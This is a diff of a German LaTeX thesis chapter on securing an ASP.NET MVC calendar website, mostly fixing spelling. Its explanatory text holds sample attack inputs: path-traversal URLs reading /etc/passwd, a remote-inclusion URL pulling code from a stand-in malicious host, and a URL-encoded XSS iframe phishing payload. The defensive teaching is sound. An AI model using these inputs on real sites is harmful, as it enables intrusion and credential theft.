@@ -2,12 +2,12 @@
 \chapter{Webseite-Security}
 \label{sec:Security}
 In diesem Abschnitt wird die Security der Webseite behandelt.
-Es wird behandelt wie man das sichere einloggen in eine Webseite gewähren kann, 
+Es wird behandelt wie man das sichere einloggen in eine Webseite gewähren kann,
 wie man sich vor XSS/CSRF schützen kann, wie man verhindert das eine SQL Injection
-möglich ist und wie man Passwörter speichert. Es werden generell alle Themen behandelt die man bei der Erstellung einer sicheren Webseite beachten muss. Dazu werden auch einige Code Beispiele angeführt werden.
+möglich ist und wie man Passwörter speichert. Es werden generell alle Themen behandelt, die man bei der Erstellung einer sicheren Webseite beachten muss. Dazu werden auch einige Code Beispiele angeführt werden.
 \section{Login Handling}
 \label{sec:Login}
-Die Webseite soll eine Login Funktion haben die es einem Nutzer des ICAL-Webservices erlaubt auf seine derzeitig vorhandenen Kalender zuzugreifen.\\Dafür muss unser Webseite eine passende sichere Authentifizierung gewährleisten können und diese sensiblen Daten in einer Datenbank verschlüsselt speichern. 
+Die Webseite soll eine Login-Funktion haben die es einem Nutzer des ICAL-Webservices erlaubt auf seine derzeitig vorhandenen Kalender zuzugreifen.\\Dafür muss unser Webseite eine passende sichere Authentifizierung gewährleisten können und diese sensiblen Daten in einer Datenbank verschlüsselt speichern. 
 (code erklären)
 \subsection{Der Login Code}
 \label{sec:Login_Handling_Code}
@@ -139,11 +139,11 @@ Man benutzt ../ als Parameter zum Wechseln des Verzeichnisses.
 \item \url{http://some_site.com.br/get-files?file=/etc/passwd}
 \end{enumerate}
 \end{enumerate}
-Anhand dieser Beispiele kann man sehen, das einem diese Schwäche ermöglicht lokale Passwörter auszulesen und Windows Configs.  
+Anhand dieser Beispiele kann man sehen, dass einem diese Schwäche erlaubt lokale Passwörter und Windows Configs auszulesen.  
 \\
-Unter Linux ist diese Schwäche kritischer da man hier auf die komplette Festplatte Zugriff bekommt. In Windows kann man sich nur im lokalen Directory bewegen, wo sich die Website befindet.
+Unter Linux ist diese Schwäche kritischer, da man hier auf die komplette Festplatte Zugriff bekommt. In Windows kann man sich nur im lokalen Verzeichnis bewegen, in dem sich die Webseite befindet.
 \\
-Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese code einzufügen mit dem man sich noch mehr Möglichkeiten verschafft. \\
+Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese Seite Code zu injizieren, mit dem man sich noch mehr Möglichkeiten verschafft. \\
 \url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}\\
 \textcite{Path-Trav}
 \subsection{Protection Path-Traversal}
@@ -152,7 +152,7 @@ Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu 
 \label{sec:xss}
 \subsection{Allgemeines über XSS}
 \label{sec:xss_allgemein}
-XSS steht für Cross-Site-Scripting und ist eine Security schwäche, welche es ausnutzt das eine Webadmin nicht davon ausgeht das eine gewisse Eingabe getätigt wird. Meist nutzt ein Hacker diese Schwäche um einen bösartigen Code auszuführen, Beispiele werden später noch behandelt werden. Trotz dem hohen Bekanntheitsgrad von XSS und findet man Cross-Site-Scripting immer noch aus der OWASP Top 10, welche die häufigsten Security Vulnerabilities Jahr für Jahr auflistet. Bei dem ausnutzen von XSS greift man sein 'Opfer' nicht direkt an, sondern man nutzt diese Schwachstelle, um bspw. ein bösartiges Skript zu platzieren, welches dann von einem nichts ahnenden Benutzer aufgerufen wird. 
+XSS steht für Cross-Site-Scripting und ist eine Security schwäche, welche es ausnutzt, dass ein Webseitenadministrator nicht davon ausgeht, dass eine gewisse Art von Benutzereingabe getätigt wird. Meist nutzt ein Hacker diese Schwäche um einen bösartigen Code auszuführen, Beispiele werden später noch behandelt werden. Trotz den hohen Bekanntheitsgrad von Cross-Site-Scripting und findet man Cross-Site-Scripting immer noch auf der OWASP Top 10, welche die häufigsten Security Schwachstellen Jahr für Jahr auflistet. Bei dem Ausnutzen von XSS greift man sein 'Opfer' nicht direkt an, sondern man nutzt diese Schwachstelle, um bspw. ein bösartiges Skript zu platzieren, welches dann von einem nichts ahnenden Benutzer aufgerufen wird. 
 \subsection{XSS Targets:}
 \label{sec:xss_targets}
 \begin{enumerate}
@@ -163,7 +163,7 @@ XSS steht für Cross-Site-Scripting und ist eine Security schwäche, welche es a
 \end{enumerate}
 \subsection{Warum ist Javascript so beliebt?}
 \label{sec:xss_why}
-Der Grund hierfür ist das Javascript quasi eine fundamentale Einheit einer Webseite ist. Man wird kaum eine Webseite finden, welche kein Javascript verwendet.
+Der Grund hierfür ist, dass Javascript quasi eine fundamentale Einheit einer Webseite ist. Man wird kaum eine Webseite finden, welche kein Javascript verwendet.
 \subsection{Beliebte Angriffsvektoren}
 \label{sec:xss_bel_agg}
 \begin{enumerate}
@@ -174,15 +174,15 @@ Der Grund hierfür ist das Javascript quasi eine fundamentale Einheit einer Webs
 \textcite{XSS}
 \subsection{Session Hijacking}
 \label{sec:xss_session_hijacking}
-Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von Webseiten übernommen. Meist bemerkt ein Benutzer gar nicht das seine Session von einem Angreifer übernommen worden ist. Das Hauptziel ist dabei das überwachen von Aktivitäten bzw. Datendiebstahl. Sehr problematisch wird es, wenn eine Admin Session zugänglich wird und der Angreifer so auf einen Admin Account zugreifen kann. Bei so einem Vorfall hat der Angreifer dann alle Rechte und kann sich so zusagen austoben, wie er will. Und hier reicht schon eine kleine XSS Vulnerability aus um dies zu bewerkstelligen. 
+Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von Webseiten übernommen. Meist bemerkt ein Benutzer gar nicht das seine Session von einem Angreifer übernommen worden ist. Das Hauptziel ist dabei, dass überwachen von Aktivitäten bzw. Datendiebstahl. Sehr problematisch wird es, wenn eine Administratorsession zugänglich wird und der Angreifer so auf einen Administrator Account zugreifen kann. Bei so einem Vorfall hat der Angreifer dann alle Rechte und kann sich so zusagen austoben, wie er will. Man sieht also eine kleine Cross-Site-Scripting Schwachstelle reicht aus um dies zu bewerkstelligen. 
 \subsection{Website-Defacements}
 \label{sec:xss_web_def}
-Website-Defacements hat etwas von digitalem Graffiti. Hier wird XSS genutzt um sich den Zugriff auf die Webseite zu verschaffen und sie dann optisch zu verändern. 
+Website-Defacements kann man mit Graffiti vergleichen, nur eben in digitaler Form. Hier wird XSS genutzt um sich den Zugriff auf die Webseite zu verschaffen und diese dann optisch zu verändern. 
 \subsection{Phishing}
 \label{sec:xss_phishing}
-Im Prinzip ist Phishing die Intention mit Fake Webseiten oder Emails an vertrauliche Daten eines Users zu kommen. Ein Beispiel wäre mit einem gefälschten Facebook Login an die Login Daten eines Benutzers zu kommen. 
-\\Doch wie hängt das mit XSS zusammen?\\Bei einer Url hat man sehr oft eine Abfragezeichenfolge. Diese werden benutzt um beliebige Werte zu übergeben. Beispielweise würde die Url 
-\url{ http://www.Sehr-Sichere-Webseite.com/program?value} den Parameter value and das Programm schicken.Und hier kommt Cross-Site-Scripting ins Spiel und man könnte wieder etwas bösartiges übergeben.\\in Angreifer könnte jetzt diese Schwäche ausnutzen um zu eine anderen Website weiterzuleiten und selbst noch etwas hinzufügen, beispielsweise der Abfrage von Login Daten. \\Beispiel\\
+Im Prinzip ist Phishing die Intention mit Fake Webseiten oder E-Mails an vertrauliche Daten eines Users zu kommen. Ein Beispiel wäre mit einem gefälschten Facebook Login an die Login Daten eines Benutzers zu kommen. 
+\\Doch wie hängt das mit XSS zusammen?\\Bei einer Url hat man sehr oft eine Abfragezeichenfolge. Diese werden benutzt um beliebige Werte zu übergeben. Beispielsweise würde die Url 
+\url{ http://www.Sehr-Sichere-Webseite.com/program?value} den Parameter value an das Programm schicken.Und hier kommt Cross-Site-Scripting ins Spiel und man könnte wieder etwas Bösartiges übergeben.\\Ein Angreifer könnte jetzt diese Schwäche ausnutzen um zu eine anderen Website weiterzuleiten und selbst noch etwas hinzufügen, beispielsweise der Abfrage von Login Daten. \\Beispiel\\
 \url{"http://www.EineFinanzseite.com/?q=%3Cscript%3Edocument.write%28%22%3Ciframe+src%3D%27
 http%3A%2F%2Fwww.BoeseSeite.com%27+
 FRAMEBORDER%3D%270%27+WIDTH%3D%27800%27+HEIGHT%3D%27640%27
@@ -203,13 +203,13 @@ Es ergibt sich daraus \\
 \\
 <iframe src='http://www.BoeseSeite.com' FRAMEBORDER='0' WIDTH='800' HEIGHT='640' scrolling='auto'></iframe>
 \\
-Diese IFrame beinhaltet jetzt Code von der Bösen Seite und ermöglicht dem Angreifen eingegebene Daten vom Benutzer zu sehen. 
+Diese IFrame beinhaltet jetzt Code von der Bösen Seite und ermöglicht dem Angreifer eingegebene Daten vom Benutzer zu sehen. 
 \textcite{Phishing}
 \subsection{Cross-Site-Tracing XST}
 \label{sec:CSTXST}
-Beim Cross-Site-Tracing wird XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert auf gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden, auch wenn für das Cookie das Kennzeichen "HttpOnly" gesetzt ist und / oder der Autorisierungsheader des Benutzers verfügbar gemacht wird.
+Beim Cross-Site-Tracing werden XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert fast gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden, auch wenn für den Cookie das Kennzeichen "HttpOnly" gesetzt ist und / oder der Autorisierungsheader des Benutzers verfügbar gemacht wird.
 \\ \\
-Obwohl die TRACE-Methode scheinbar harmlos ist, kann sie in einigen Szenarien erfolgreich eingesetzt werden, um die Berechtigungsnachweise legitimer Benutzer zu stehlen. Diese Angriffsmethode wurde 2003 von Jeremiah Grossman entdeckt, um den HttpOnly-Tag zu umgehen, den Microsoft in Internet Explorer 6 sp1 eingeführt hat, um Cookies vor dem Zugriff durch JavaScript zu schützen. Tatsächlich besteht eines der am häufigsten auftretenden Angriffsmuster in Cross Site Scripting darin, auf das document.cookie -Objekt zuzugreifen und es an einen vom Angreifer kontrollierten Webserver zu senden, damit er / sie die Sitzung des Opfers entführen kann. Das Markieren eines Cookies, da HttpOnly JavaScript den Zugriff auf das Cookie verbietet und es vor dem Senden an Dritte schützt. Die TRACE-Methode kann jedoch verwendet werden, um diesen Schutz zu umgehen und auf das Cookie selbst in diesem Szenario zuzugreifen.
+Obwohl die TRACE-Methode scheinbar harmlos ist, kann sie in einigen Szenarien erfolgreich eingesetzt werden, um die Berechtigungsnachweise legitimer Benutzer zu stehlen. Diese Angriffsmethode wurde 2003 von Jeremiah Grossman entdeckt, um den HttpOnly-Tag zu umgehen, den Microsoft in Internet Explorer 6 sp1 eingeführt hat, um Cookies vor dem Zugriff durch JavaScript zu schützen. Tatsächlich besteht eines der am häufigsten auftretenden Angriffsmuster in Cross Site Scripting darin, auf das document.cookie -Objekt zuzugreifen und es an einen vom Angreifer kontrollierten Webserver zu senden, damit er / sie die Sitzung des Opfers übernehmen kann. Das Markieren eines Cookies alls HttpOnly verbietet JavaScript das Stehlen dieses Cookies und damit kann dieser Cookie nicht an Dritte weitergegeben werden. Die TRACE-Methode kann jedoch verwendet werden, um diesen Schutz zu umgehen und auf das Cookie selbst in diesem Szenario zuzugreifen.
 \\
 Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
 \pagebreak
@@ -228,7 +228,7 @@ Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
 \textcite{XST}
 \subsection{Wie wird XSS Protection gewährleistet}
 \label{sec:xss_prot}
-Die Webseite beschränkt sich generell auf wenige Eingabe fenster wo eine Standard XSS versucht werden könnte. Alle diese Eingaben erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesendet werden und somit fällt auch der URL Faktor weg.\\ \\Alle Möglichen Eingabefelder
+Die Webseite beschränkt sich generell auf wenige Eingabefelder wo eine Standard XSS versucht werden könnte. Alle diese Eingabefelder erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesendet werden und somit fällt auch der URL als Schwachstelle weg.\\ \\Alle Möglichen Eingabefelder
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_XSS_img1}
     \caption{Webseite Eingabefeld 1}
@@ -245,16 +245,16 @@ Die Webseite beschränkt sich generell auf wenige Eingabe fenster wo eine Standa
     \label{fig:webxxs1}
 \end{figure}
 In den URLS werden durch MVC und passende Implementierung nie Parameter gesendet bei denen man XSS Code einfügen könnte.\\
-Dadurch hat unsere Webseite eine Funktionierende XSS Protection
+Dadurch hat unsere Webseite eine Funktionierende XSS Protection.
 \subsection{HTTP}
 Erklärung hinzufügend zu CSRF
 \section{XSRF/CSRF Protection}
 \label{sec:csrf}
 \subsection{Was ist XSRF/CSRF}
 \label{sec:xsrf_what}
-CSRF steht für Cross-Site Request Forgery. CSRF ist ein Angriff, bei dem das Opfer dazu gebracht wird, eine böswillige Anfrage zu übermitteln. Als Angreifer erbt man dabei die Identität und die Privilegien des Opfers und kann beispielsweise eine unerwünschte Funktion im Namen des Opfers ausführen. Bei den meisten Websites enthalten Browser-Anforderungen automatisch alle mit der Website verknüpften Anmeldeinformationen, z. B. Sitzungscookies des Benutzers, IP-Adresse, Anmeldeinformationen der Windows-Domäne usw. Wenn der Benutzer derzeit für die Seite authentifiziert ist, hat die Seite keine Möglichkeit, zwischen der vom Opfer gesendeten gefälschten Anfrage und einer vom Opfer gesendeten legitimen Anfrage zu unterscheiden.
+CSRF steht für Cross-Site-Request-Forgery. CSRF ist ein Angriff, bei dem das Opfer dazu gebracht wird, eine böswillige Anfrage zu übermitteln. Als Angreifer erbt man dabei die Identität und die Privilegien des Opfers und kann beispielsweise eine unerwünschte Funktion im Namen des Opfers ausführen. Bei den meisten Webseiten enthalten Browseranforderungen automatisch alle mit der Webseite verknüpften Anmeldeinformationen, zum Beispiel Session-Cookies des Benutzers, IP-Adresse, Anmeldeinformationen der Windowsdomäne usw. Wenn der Benutzer derzeit für die Seite authentifiziert ist, hat die Seite keine Möglichkeit, zwischen der vom Opfer gesendeten gefälschten Anfrage und einer vom Opfer gesendeten legitimen Anfrage zu unterscheiden.
 \\
-Eine CSRF zielt oft darauf Daten zu Ändern. Beispielsweise das Kennwort und die Email eines Kontos oder das Kaufen eines Gegenstands.   der Angreifer erhält keine Antwort , sondern das Opfer. CSRF-Angriffe zielen daher auf Zustandsänderungsanforderungen ab.
+Eine CSRF zielt oft darauf Daten zu verändern. Beispielsweise das Kennwort und die Email eines Kontos oder das Kaufen eines Gegenstandes.Bei einem CSRF-Angriff wird immer der derzeitige Benutzer der sie ausführt benachrichtigt, daher zielen CSRF-Angriffe auf Zustandsänderungsanforderungen ab.
 \\
 Es ist manchmal möglich, den CSRF-Angriff auf der verwundbaren Seite selbst zu speichern. Das kann durch einfaches Speichern eines IMG- oder IFRAME-Tags in einem HTML-fähigen Feld oder durch einen komplexeren Cross-Site-Scripting-Angriff erreicht werden. Wenn der Angriff einen CSRF-Angriff in der Seite speichern kann, wird der Schweregrad des Angriffs erhöht. 
 \subsection{Wie Funktioniert eine Solche Attacke}
@@ -314,32 +314,32 @@ Dies generiert.\\
 %https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.2
 \section{Hashes}
 \label{hash-expl}
-Die Erklärung von HASHes wird mit einem Beispiel begonnen.
-\\Ziel ist es ein File von einem Computer zu einem anderen Computer schicken und es ist sehr wichtig das man dabei feststellen kann, das es nicht verändert wurde. Um das zu gewährleisten, gibt es HASH Algorithmen. Ein HASH ist eine Einwegfunktion, heißt man kann einen HASH für ein File berechnen aber nicht aus dem HASH das File holen.\\
-Drei Sachen sind bei einem HASH Algorithmus wichtig.
+Die Erklärung von Hashes wird mit einem Beispiel begonnen.
+\\Ziel ist es ein File von einem Computer zu einem anderen Computer schicken und es ist sehr wichtig das man dabei feststellen kann, das es nicht verändert wurde. Um das zu gewährleisten, gibt es Hash Algorithmen. Ein Hash ist eine Einwegfunktion, heißt man kann einen Hash für ein File berechnen aber nicht aus dem Hash das File holen.\\
+Drei Sachen sind bei einem Hash Algorithmus wichtig.
 \begin{enumerate}
 \item Geschwindigkeit
-\item Ändert man ein 1-bit sollte der gesamte HASH anders sein
-\item HASH Kollisionen verhindern 
+\item Ändert man ein 1-bit sollte der gesamte Hash anders sein
+\item Hash Kollisionen verhindern 
 \end{enumerate}
-\subsection{HASH Kollisionen}
+\subsection{Hash Kollisionen}
 \label{sec:hash_coll}
-Man habe ein wichtiges Dokument, das man der Leitung in der IT schicken. Mit dem Dokument kommt der HASH damit die IT verifizieren kann das jenes Dokument auch das richtige ist. Ist es jetzt dem Hacker möglich das File zu bekommen und zu verändern, würde der HASH ein anderer sein. Ist der HASH algorithmus aber nicht richtig implementiert und somit nicht funktionsfähig ist, es möglich für das File den originalen HASH festzulegen.
+Man habe ein wichtiges Dokument, das man der Leitung in der IT schicken. Mit dem Dokument kommt der Hash damit die IT verifizieren kann das jenes Dokument auch das richtige ist. Ist es jetzt dem Hacker möglich das File zu bekommen und zu verändern, würde der Hash ein anderer sein. Ist der Hash algorithmus aber nicht richtig implementiert und somit nicht funktionsfähig ist, es möglich für das File den originalen Hash festzulegen.
 \\
 Beispiele
 \begin{enumerate}
 \item MD5
 \item SHA1
 \end{enumerate}
-Der Faktor Schnelligkeit ist sehr relevant, ist der Algorithmus zu langsam will ihn keiner nutzen, ist er aber zu schnell kann man recht einfach Dokument erstellen welches zwar anders ist aber den selben HASH als das Orginal hat.
-\section{Wie funktioniert ein HASH Algorithmus}
+Der Faktor Schnelligkeit ist sehr relevant, ist der Algorithmus zu langsam will ihn keiner nutzen, ist er aber zu schnell kann man recht einfach Dokument erstellen welches zwar anders ist aber den selben Hash als das Orginal hat.
+\section{Wie funktioniert ein Hash Algorithmus}
 \label{sec:hash_algo}
-Wie ein HASH Algorithmus grundsätzlich arbeitet werde ich anhand von SHA-256 erklären. 
+Wie ein Hash Algorithmus grundsätzlich arbeitet werde ich anhand von SHA-256 erklären. 
 \subsection{Allgemeines über SHA256}
 \label{sec:hash_sha}
-SHA256(secure hash algorithm) ist ein kryptografischer HASH mit eine Zeichenlänge von 256 bits. Es ist eine Schlüssellose HASH-Funktion.
+SHA256(secure hash algorithm) ist ein kryptografischer Hash mit eine Zeichenlänge von 256 Bits. Es ist eine schlüssellose Hash-Funktion.
 \\
-Eine Nachricht wird in jeweils 512 Blöcken (16 * 32 Bits) abgearbeitet und jeder block benötigt 64 Runden.
+Eine Nachricht wird in jeweils 512 Bitblöcken (16 * 32 Bits) abgearbeitet und jeder block benötigt 64 Runden.
 \subsection{Der Algorithmus}
 \label{sec:hash_sha_alg}
 Basis Operationen
@@ -401,12 +401,12 @@ Formel 2:\\
 \subsection{Passwort Hashes}
 \label{sec:pwdhash}
 Wie die Wahl eines sicheren Passsworts vom Benutzer, ist es genau so wichtig für den Service Provider, dass dieser das Passwort seiner Benutzer hasht.
-[https://crackstation.net/hashing-security.htm]
+% Wie das gemacht werden kann -> [https://crackstation.net/hashing-security.htm]
 \chapter{ASP.NET MVC}
 \label{sec:MVC}
 \section{Allgemeines MVC}
 \label{sec:allgemein}
-In diesem Abschnitt dreht sich um ASP .NET MVC womit die Webseite des ICAL-Webservices geschrieben wurde. Hier wird die Grundindention von MVC und was MVC ist besprochen. Wie die Webseite aufgebaut wurde werden wird anhand von Code auszügen gezeigt. Die beim MVC bekannten Views Controllers und Services werden aufgezeigt und erklärt. Ebenfalls wird behandelt wie die Links zu den Kalendern erzeugt und zur Verfügung gestellt werden. 
+In diesem Abschnitt dreht sich um ASP .NET MVC womit die Webseite des ICAL-Webservices geschrieben wurde. Hier wird die Grundidention von MVC und was MVC ist besprochen. Wie die Webseite aufgebaut wurde werden wird anhand von Code Auszügen gezeigt. Die beim MVC bekannten Views Controllers und Services werden aufgezeigt und erklärt. Ebenfalls wird behandelt, wie die Links zu den Kalendern erzeugt und zur Verfügung gestellt werden. 
 \section{Erstellung der Webseite}
 \label{sec:erstellung_ws}
 Dieses Kapitel befässt sich damit wie man in Visual-Studio ein MVC-Website Projekt erstellen kann.\\
@@ -463,7 +463,7 @@ Danach hat man erfolgreich eine MVC-Website erstellt und kann diese über IIS Ex
 \end{figure}
 \section{Aufbau der Webseite }
 \label{sec:aufbau}
-In diesem Kapitel wird begahandelt wie die Webseite des ICAL-Webservices aufgebaut ist. Dazu folgen nun einige Screenshots der Webseite.
+In diesem Kapitel wird behandelt wie die Webseite des ICAL-Webservices aufgebaut ist. Dazu folgen nun einige Screenshots der Webseite.
 Zunächst kommt man auf die Hauptseite\\
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_Main}
@@ -547,12 +547,12 @@ public List<string> getUsersTables(string myuser)
     return tables;
 }
 \end{lstlisting}
-Bei dem Benutztem SQL Statement könnte man denken das eine SQL-Injection Möglich wäre, ist es aber nicht da hier der übergebene String nicht von der Eingabe des Users abhängt sondern fix im Programm ist.
+Bei dem benutztem SQL Statement könnte man denken das eine SQL-Injection möglich wäre, ist es aber nicht, da hier der übergebene String nicht von der Eingabe des Users abhängt, sondern fix im Programm ist.
 \section{Controller}
 \label{sec:Controller}
-MVC-Controller sind dafür verantwortlich, auf Anfragen zu reagieren, die an eine ASP.NET MVC-Website gesendet werden. Jede Anforderung wird dazu einem bestimmten Controller zugeordnet. Als Beispiel gibt man die folgende URL von unserem ICALWebservices in die Adressleiste eines Webbrowsers ein:\\
+MVC-Controller sind dafür verantwortlich, auf Anfragen zu reagieren, die an eine ASP.NET MVC-Website gesendet werden. Jede Anforderung wird dazu einem bestimmten Controller zugeordnet. Als Beispiel gibt man die folgende URL von unserem ICAL-Webservices in die Adressleiste eines Webbrowsers ein:\\
 \url{http://localhost:50699/api/iCal/1} \\
-In diesem Fall ruft man einen Kontroller mit dem Namen iCalController auf. Dieser iCalController ist dafür zuständig im Hintergrund sich den ICAL mit der jeweiligen ID zu holen und eine HTTP-Response zu liefern.\\ Hier sehen sie wie dies implementiert wird.
+In diesem Fall ruft man einen Kontroller mit dem Namen iCalController auf. Dieser iCalController ist dafür zuständig im Hintergrund sich den ICAL-Kalender mit der jeweiligen ID zu holen und eine HTTP-Response zu liefern.\\ Hier sehen sie wie dies implementiert wird.
 \begin{lstlisting}
 using iCalWebService.BL;
 using Microsoft.AspNetCore.Mvc;
@@ -569,7 +569,7 @@ Wie man sehen kann ist ein Controller nur eine Klasse.
 Kontroller Actions sind öffentliche Methoden die aufgerufen werden wenn ein Kontroller mit einer spezifischen URL aufgerufen wird. Worauf man hier achten muss ist, dass jede dieser öffentlichen Methoden von jedem über die richtige URL aufgerufen werden kann und deshalb hier sehr darauf geachtet werden muss was hier aufgerufen werden kann. 
 \subsection{Action Results}
 \label{sec:controller_actions_results}
-Eine Controller-Aktion gibt ein so genanntes Aktionsergebnis zurück. Ein Aktionsergebnis ist das, was eine Controller-Aktion als Antwort auf eine Browseranforderung zurückgibt.\\Das MVC-Framework von ASP.NET unterstützt verschiedene Arten von Aktionsergebnissen, darunter:
+Eine Controller-Aktion gibt ein sogenanntes Aktionsergebnis zurück. Ein Aktionsergebnis ist das, was eine Controller-Aktion als Antwort auf eine Browseranforderung zurückgibt.\\Das MVC-Framework von ASP.NET unterstützt verschiedene Arten von Aktionsergebnissen, darunter:
 \begin{enumerate}
 \item ViewResult - Represents HTML and markup.
 \item EmptyResult - Represents no result.
@@ -585,7 +585,7 @@ Alle diese Resultate kommen von der Basis Klasse ActionResult.
 \textcite{mic_controller}
 \subsection{Views}
 \label{sec:Views}
-Für ASP.NET oder Active Server Pages enthält ASP.NET MVC nichts, was direkt einer HTML-Seite entspricht. In einer ASP.NET MVC-Anwendung befindet sich keine HTML-Seite auf der Festplatte gespeichert, die dem Pfad in der URL entspricht, den man in die Adressleiste des Browsers eingibt. Die Seite, die einer Seite in einer ASP.NET-MVC-Anwendung am nächsten kommt, wird als View bezeichnet.\\
+Anders als in ASP.NET oder Active Server Pages enthält ASP.NET MVC nichts, was direkt einer HTML-Seite entspricht. In einer ASP.NET MVC-Anwendung befindet sich keine HTML-Seite auf der Festplatte gespeichert, die dem Pfad in der URL entspricht, den man in die Adressleiste des Browsers eingibt. Die Seite, die einer HTML-Seite in einer ASP.NET-MVC-Anwendung am nächsten kommt, wird als View bezeichnet.\\
 In einer ASP.NET-MVC-Anwendung werden eingehende Browser Requests Controller Methoden zugeordnet. Eine Controller-Methode kann einen View zurückgeben. Eine Controller-Methode führt jedoch möglicherweise eine andere Methode aus, z. B. das weiterleiten zu einer anderen Controller-Methode.
 \subsection{Beispiel einer View}
 \label{mvc_view_beispiel}
@@ -593,7 +593,7 @@ Als Beispiel folgt hier die cshtml des Registrierens auf der Webseite.
 \begin{lstlisting}
 @model RegisterViewModel
 @{
-	//Hier setzt man den Titel der Seite
+  //Hier setzt man den Titel der Seite
     ViewData["Title"] = "Register";
 }
 <h2>@ViewData["Title"]</h2>
@@ -637,9 +637,9 @@ Als Beispiel folgt hier die cshtml des Registrierens auf der Webseite.
 Ein wichtiger Bereich der UserDB ist der Salt,also wird dieses Thema zuerst besprochen.
 \subsection{Salt}
 \label{sec:salt}
-Salt kommt aus der Kryptographie und ist eine zufällige Zeichenfolge, die man an den Klartext (bspw. einem Passwort eines Users) angehängt wird, bevor dieser einer Hashfunktion übergeben wird und in einen HASH umgewandelt. Dies wird gemacht um die Entropie der Eingabe zu erhöhen. Man nutzt einen Salt oft für die Speicherung von Passwörtern in Datenbanken. Wird ein Passwort überprüft wird dabei aber nicht jedesmal ein neuer Salt generiert, da sich ja sonst der entstandene Hashwert von dem gespeichertem Hashwert unterscheiden würde und somit das Passwort als Falsch erkannt werden würde. Deswegen speichert man bei der Speicherung des Passworts in der Datenbank den dafür generierten Salt-Wert auch ab.
+Salt kommt aus der Kryptographie und ist eine zufällige Zeichenfolge, die man an den Klartext (bspw. einem Passwort eines Users) angehängt wird, bevor dieser einer Hashfunktion übergeben wird und in einen Hash umgewandelt. Dies wird gemacht um die Entropie der Eingabe zu erhöhen. Man nutzt einen Salt oft für die Speicherung von Passwörtern in Datenbanken. Wird ein Passwort überprüft wird dabei aber nicht jedesmal ein neuer Salt generiert, da sich ja sonst der entstandene Hashwert von dem gespeichertem Hashwert unterscheiden würde und somit das Passwort als Falsch erkannt werden würde. Deswegen speichert man bei der Speicherung des Passworts in der Datenbank den dafür generierten Salt-Wert auch ab.
 \subsubsection{Warum Salt}
-Hashfunktionen wie SHA oder MD5 oder zum Hashen von Passwörtern entwickelte Hashfunktionen erzeugen für unterschiedliche Klartexte jeweils unterschiedliche Hash-Werte. Bei einer Hashfunktion ist es äußerst unwahrscheinlich, dass jene für zwei gleiche Klartexte zwei unterschiedliche Hashwerte erzeugt. Daraus folgt das der Hashwert eines Passworts stehts der selbe ist. Somit kann man erkennen welche Benutzer das selbe Passwort nutzen. Benutzen viele Benutzer das selbe Passwort gibt es viele gleiche Hashwerte, wodurch man annehmen kannd das hier ein eher schwaches bekanntes Passwort benutzt wird, wodurch Angreifer dann auf BruteForce Angriffe setzen könnten. Bei Bruteforce Angriffen benutzt man entweder eine Liste bekannter Passwörter und geht diese Zeile für Zeile durch oder benutzt direkt alle Möglichkeiten die es geben könnte.Hätte man Beispielsweise ein Passwort das aus 2 Kleinbuchstaben bestehen würde, würde man alle Kombinationen die es gibt durchtesten. \\ Code Beispiel:
+Hashfunktionen wie SHA oder MD5 oder andere zum Hashen von Passwörtern entwickelte Hashfunktionen erzeugen für unterschiedliche Klartexte jeweils unterschiedliche Hash-Werte. Bei einer Hashfunktion ist es äußerst unwahrscheinlich, dass jene für zwei gleiche Klartexte zwei unterschiedliche Hashwerte erzeugt. Daraus folgt das der Hashwert eines Passworts stehts der selbe ist. Somit kann man erkennen welche Benutzer das selbe Passwort nutzen. Benutzen viele Benutzer das selbe Passwort gibt es viele gleiche Hashwerte, wodurch man annehmen kannd das hier ein eher schwaches bekanntes Passwort benutzt wird, wodurch Angreifer dann auf BruteForce Angriffe setzen könnten. Bei Bruteforce Angriffen benutzt man entweder eine Liste bekannter Passwörter und geht diese Zeile für Zeile durch oder benutzt direkt alle Möglichkeiten die es geben könnte.Hätte man Beispielsweise ein Passwort das aus 2 Kleinbuchstaben bestehen würde, würde man alle Kombinationen die es gibt durchtesten. \\ Code Beispiel:
 \begin{lstlisting} 
 for i in {a..z}; do for j in {a..z}; do echo $i$j;done;done 
 \end{lstlisting}
@@ -651,4 +651,4 @@ ad\\
 ae\\
 af\\
 ..\\
-Durch beifügen des Salt ist der Hashwert für gleiche Passwörter anders und somit ist nicht direkt ersichtlich wie viele Benutzer das gleiche Passwort nutzen. Dadurch kann ein Angreifer auch beim Einblick in die Datenbank nicht annehmen, dass einfache Passwörter genutzt werden, da er nicht abschätzen wie viel gleiche Passwörter es gibt.
+Durch beifügen des Salt ist der Hashwert für gleiche Passwörter anders und somit ist es nicht direkt ersichtlich wie viele Benutzer das gleiche Passwort nutzen. Dadurch kann ein Angreifer auch beim Einblick in die Datenbank nicht annehmen, dass einfache Passwörter genutzt werden, da er nicht abschätzen wie viel gleiche Passwörter es in der Datenbank gibt.
